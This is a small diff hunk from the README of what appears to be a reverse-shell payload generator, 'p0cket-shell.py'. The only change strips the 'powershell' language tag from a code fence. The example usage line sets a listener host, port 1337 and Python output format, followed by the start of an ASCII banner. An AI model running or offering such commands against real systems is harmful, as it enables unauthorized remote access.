@@ -44,7 +44,7 @@ p0cket-shell.py --payload  [hardcode | resolve]
 
 ### Example
 
-```powershell
+```
 .\p0cket-shell.py -p hardcode -lh 192.168.1.190 -lp 1337 -f python
             ____       __        __             __         ____
      ____  / __ \_____/ /_____  / /_      _____/ /_  ___  / / /
